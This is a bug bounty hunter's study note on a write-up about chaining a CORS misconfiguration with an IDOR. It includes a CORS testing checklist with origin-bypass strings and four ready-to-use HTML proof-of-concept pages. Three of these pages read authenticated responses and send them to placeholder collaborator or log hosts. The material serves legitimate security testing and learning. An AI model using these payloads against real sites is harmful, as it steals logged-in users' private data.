# Writeup titie: How I Earned $1,000 by Exploiting a Hidden Subdomain and Chaining a CORS Misconfiguration with IDOR

**Source/Link:** https://theindiannetwork.medium.com/how-i-earned-1-000-by-exploiting-a-hidden-subdomain-and-chaining-a-cors-misconfiguration-with-idor-1dc83adf927c

**Date Read:** 2026-10-21

## Summary

Hunter targeted a finance SaaS with wide subdomain scope. Standard subfinder/assetfinder/amass recon turned up ~800 subdomains; httpx filtered to live hosts and flagged `legacy-api.target.com` as interesting (Express.js, CORS enabled). Endpoint fuzzing found nothing, but manually reading response headers revealed a CORS misconfig. Chained with an IDOR on an invoice endpoint to read other users' billing data. $1,000 bounty, triaged same day.

## Key Lessons

- Forgotten/legacy subdomains are frequently under-tested — most hunters focus on the main app
- Response headers deserve manual inspection, not just automated scanning — the CORS bug wasn't caught by directory fuzzing
- Low/medium severity bugs become high-impact when chained (CORS + IDOR here)
- Numeric IDs in API params (`?id=20485`) are always worth incrementing regardless of how minor the endpoint seems

## New Things I Learned

- The writeup describes `Access-Control-Allow-Origin: *` existing alongside `Access-Control-Allow-Credentials: true` — this combination is actually forbidden by the Fetch spec and browsers reject it. The real mechanism was almost certainly **origin reflection** (server echoing the request's Origin header back dynamically), not a literal static wildcard. Confirmed via Intigriti's CORS guide and HackTricks — both state this combo "cannot happen in the real world."
- Built out a full ordered CORS testing methodology from this (see Testing Methodology below) — cited from Intigriti's exploitation guide, more rigorous than what the writeup itself documented.
- Distinguished `null`-origin exploitation (needs sandboxed iframe PoC, can't use plain fetch) from standard reflected-origin exploitation (plain fetch works).
- Whitelisted dev platforms (github.io, codepen.io, jsfiddle.net, stackblitz.com) are a real bypass path when CI/testing origins get left in prod allowlists.

## How This Applies to Bug Bounty

Direct fit for authz-lab and skill-stack practice — CORS + IDOR chaining is squarely in my IDOR/business-logic/auth focus area. The recon pattern (full subdomain enum → filter alive → manually read headers on anything interesting) is now a standing step in my methodology rather than something I'd only do opportunistically. Also a good reminder to budget time for chaining low-severity findings together rather than discarding them individually.

## Updated scripts for CORS

```swift
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://TARGET-SITE/sensitive-endpoint', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  fetch('https://YOUR-COLLABORATOR-URL/log?key=' + data.FIELD_NAME);
})
.catch(err => {
  // Swallowed in production PoC; use DevTools Console while debugging
});
</script>
</body>
</html>

or use this 
<!DOCTYPE html>
<html>
<body>
<script>
var req = new XMLHttpRequest();
req.onload = function(){
  location='https://YOUR-COLLABORATOR-URL/log?key='+this.responseText;
};
req.open('get','https://TARGET-SITE/sensitive-endpoint',true);
req.withCredentials = true;
req.send();
</script>
</body>
</html>

THIS ONE IS FROM A WRITEUP (SO ITS LEGIT) : I could read user data from an authenticated session, if the victim visited my page.
<!DOCTYPE html>
<html>
<body>
<script>
  fetch("https://target.com/api/endpoint", {
    credentials: "include"
  })
  .then(res => res.text())
  .then(data => document.body.innerText = data);
</script>
</body>
</html>

TAKEN FROM THE NULL-LAB
<!DOCTYPE html>
<html>
<body>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
var req = new XMLHttpRequest();
req.onload = function(){
  location='https://YOUR-LOG-ENDPOINT/log?key='+this.responseText;
};
req.open('get','https://TARGET-SITE/accountDetails',true);
req.withCredentials = true;
req.send();
</script>
"></iframe>
</body>
</html>
```

## Testing Methodology

- [x] Baseline — confirm endpoint is session/auth-gated
- [x] Send `Origin: https://attacker.com`, check for ACAO reflection + ACAC:true
- [x] If no reflection, try substring/regex bypasses (`trusted.attacker.com`, `target.comattacker.com`, `attacker.comtarget.com`, `targetcom`, `target.computer`, `localhosttarget.com`)
- [x] Try special-char bypasses if needed (`%`, `@`, backtick — Safari only, needs wildcard DNS)
- [x] Test `null` origin via sandboxed iframe PoC
- [x] Check whitelisted dev platforms (github.io, codepen.io, jsfiddle.net, stackblitz.com)
- [x] Build PoC (fetch or XHR, credentials:include), host on GitHub Pages, trigger while authenticated, read exfiltrated data via Collaborator or console

(Full ordered methodology also saved to memory under skill-stack for reuse across targets.)

## Notes
Writeup itself was fairly shallow/non-technical (3 min read, no real payload detail) — useful mainly as a trigger to build out the actual CORS methodology properly using better sources (Intigriti, HackTricks) rather than as a standalone technical reference. Good candidate for "low-effort writeup, high-effort methodology extraction" — the value was in filling gaps the author glossed over, not in the writeup's own content.
